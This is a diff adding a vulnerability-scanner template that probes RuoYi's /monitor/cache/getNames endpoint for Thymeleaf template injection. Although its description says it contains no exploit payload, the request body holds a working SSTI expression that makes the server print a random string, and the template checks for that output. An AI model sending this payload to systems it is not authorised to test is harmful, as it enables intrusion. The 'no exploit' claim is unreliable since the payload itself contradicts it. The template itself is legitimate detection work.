@@ -1,0 +1,45 @@
+id: ruoyi-monitor-cache-getnames
+
+info:
+  name: RuoYi /monitor/cache/getNames - Exposed Endpoint (Suspected SSTI Sink)
+  author: qwtd
+  severity: high
+  description: |
+    Detects whether a RuoYi-like endpoint /monitor/cache/getNames is exposed and accepts the 'fragment' parameter.
+    Public analyses indicate similar endpoints may concatenate 'fragment' into a Thymeleaf view fragment selector,
+    which can become an SSTI sink if not properly constrained. This template does NOT include an exploit payload.
+  reference:
+    - https://cn-sec.com/archives/4747324.html
+    - https://github.com/ax1sX/SecurityList/blob/main/Java_OA/RuoYi.md
+  classification:
+    cwe-id: CWE-1336
+  metadata:
+    verified: false
+    max-request: 2
+    product: ruoyi
+  tags: 若依-管理系统
+
+http:
+  - raw:
+      - |
+        POST /monitor/cache/getNames HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: JSESSIONID=df19949a-220d-4b25-aaaa-5d5568f6d721
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 57
+
+        fragment=__|$${#response.getWriter().print('{{randstr}}')}|__::.x
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - '{{randstr}}'
